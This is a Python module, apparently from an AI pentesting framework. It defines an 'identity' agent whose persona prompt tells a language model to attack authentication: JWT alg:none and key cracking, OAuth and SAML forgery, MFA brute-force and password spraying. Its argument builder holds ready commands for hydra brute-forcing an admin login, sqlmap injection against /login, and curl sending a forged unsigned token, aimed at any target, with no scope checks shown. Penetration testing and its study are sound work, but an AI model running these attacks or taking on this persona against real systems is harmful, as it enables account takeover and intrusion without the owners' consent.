"""PHANTOM AI v3 — Identity Agent: JWT, OAuth, SAML, sessions, MFA."""
from typing import List
from .base import BaseAgent, WL_ROCKYOU


class IdentityAgent(BaseAgent):

    @property
    def agent_id(self): return "identity"

    @property
    def tools(self):
        return ["jwt_tool", "hydra", "curl", "sqlmap"]

    @property
    def persona(self):
        return (
            "You are the PHANTOM IDENTITY agent — an expert in authentication, "
            "identity federation, and access control vulnerabilities. "
            "Modern breaches almost always start here. Your priorities: "
            "1) JWT attacks — algorithm confusion (RS256→HS256), alg:none bypass, weak HMAC keys (crack with RockYou). "
            "2) OAuth/OIDC — open redirect_uri, state parameter CSRF, token leakage in Referer/logs. "
            "3) SAML — XML signature wrapping, assertion forgery, XXE in SAMLResponse. "
            "4) Session management — fixation, missing Secure/HttpOnly flags, predictable tokens. "
            "5) MFA — brute-force backup codes, SIM-swap indicators, TOTP window too wide. "
            "6) Password policies — spray with rockyou, check lockout, check reset flow. "
            "Format: THOUGHT: ... | HYPOTHESIS: ... | ACTION: <tool_name> | FINDING: ..."
        )

    def build_args(self, tool: str, target: str, depth: str) -> List[str]:
        return {
            "jwt_tool":  ["-t", f"https://{target}", "--all"],
            "hydra":     ["-l", "admin", "-P", WL_ROCKYOU, target,
                          "http-post-form", "/login:user=^USER^&pass=^PASS^:Invalid", "-t", "4", "-f"],
            "curl":      ["-sI", f"https://{target}", "-L", "--max-time", "10",
                          "-H", "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.e30."],
            "sqlmap":    ["-u", f"https://{target}/login", "--data", "user=admin&pass=test",
                          "--batch", "--level=2", "--forms", "--quiet"],
        }.get(tool, [target])
